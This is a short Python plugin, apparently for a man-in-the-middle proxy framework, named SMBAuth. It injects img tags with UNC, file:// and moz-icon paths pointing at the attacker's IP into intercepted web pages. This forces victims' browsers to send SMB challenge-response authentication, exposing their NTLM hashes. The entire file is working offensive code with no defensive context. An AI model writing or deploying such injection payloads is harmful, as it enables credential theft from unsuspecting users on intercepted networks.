from plugins.plugin import Plugin
from plugins.inject import Inject

class SMBAuth(Plugin):
    name = 'SMBAuth'
    optname = 'smbauth'
    desc = "Evoke SMB challenge-response auth attempts"
    version = '0.1'

    def initialize(self, context):
        context.html_payload = '<img src=\"\\\\{}\\image.jpg\">'\
                               '<img src=\"file://///{}\\image.jpg\">'\
                               '<img src=\"moz-icon:file:///%%5c/{}\\image.jpg\">'.format(*tuple([context.ip]*3))

    def response(self, context, flow):
        Inject().response(context, flow)